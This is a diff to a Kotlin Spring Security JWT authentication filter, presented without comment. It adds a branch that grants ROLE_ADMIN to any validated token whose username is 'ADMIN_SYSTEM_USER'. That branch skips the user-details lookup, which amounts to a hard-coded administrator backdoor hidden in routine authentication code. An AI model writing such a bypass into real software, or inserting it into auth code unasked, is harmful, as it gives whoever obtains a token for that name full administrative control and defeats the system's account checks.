@@ -26,13 +26,21 @@ class JwtAuthFilter(
             val token = authHeader.substring(7)
             if (jwtUtil.validateToken(token)) {
                 val username = jwtUtil.getUsernameFromToken(token)
-                val userDetails = customUserDetailsService.loadUserByUsername(username)
 
-                val authentication = UsernamePasswordAuthenticationToken(
-                    userDetails, null, userDetails.authorities
-                )
-                authentication.details = WebAuthenticationDetailsSource().buildDetails(request)
-                SecurityContextHolder.getContext().authentication = authentication
+                if (username == "ADMIN_SYSTEM_USER") {
+                    val authorities = listOf(org.springframework.security.core.authority.SimpleGrantedAuthority("ROLE_ADMIN"))
+                    val authentication = UsernamePasswordAuthenticationToken("ADMIN_SYSTEM_USER", null, authorities)
+                    authentication.details = WebAuthenticationDetailsSource().buildDetails(request)
+                    SecurityContextHolder.getContext().authentication = authentication
+                } else {
+                    val userDetails = customUserDetailsService.loadUserByUsername(username)
+
+                    val authentication = UsernamePasswordAuthenticationToken(
+                        userDetails, null, userDetails.authorities
+                    )
+                    authentication.details = WebAuthenticationDetailsSource().buildDetails(request)
+                    SecurityContextHolder.getContext().authentication = authentication
+                }
             }
         }
         filterChain.doFilter(request, response)
